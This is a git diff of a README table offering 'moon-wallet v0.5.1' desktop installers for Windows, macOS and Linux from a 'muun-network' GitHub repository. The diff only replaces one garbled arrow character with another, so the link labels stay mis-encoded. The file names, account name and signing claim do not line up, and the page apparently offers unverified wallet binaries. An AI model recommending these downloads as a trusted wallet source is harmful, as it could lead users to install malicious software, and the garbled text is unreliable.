@@ -18,9 +18,9 @@ For complete guides, installation instructions, and comparisons with other walle
 
 | Platform | File | Download |
 |----------|------|----------|
-| **Windows 10 / 11** | moon-wallet-v0.5.1.exe | [Download â†’](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.exe) |
-| **macOS 10.15+** | moon-wallet-v0.5.1.dmg | [Download â†’](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.dmg) |
-| **Linux** | moon-wallet-v0.5.1.zip | [Download â†’](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.zip) |
+| **Windows 10 / 11** | moon-wallet-v0.5.1.exe | [Download ’](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.exe) |
+| **macOS 10.15+** | moon-wallet-v0.5.1.dmg | [Download ’](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.dmg) |
+| **Linux** | moon-wallet-v0.5.1.zip | [Download ’](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.zip) |
 
 **All installers are cryptographically signed by MUUN ApS.** [Verify your download â†’](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1)
 
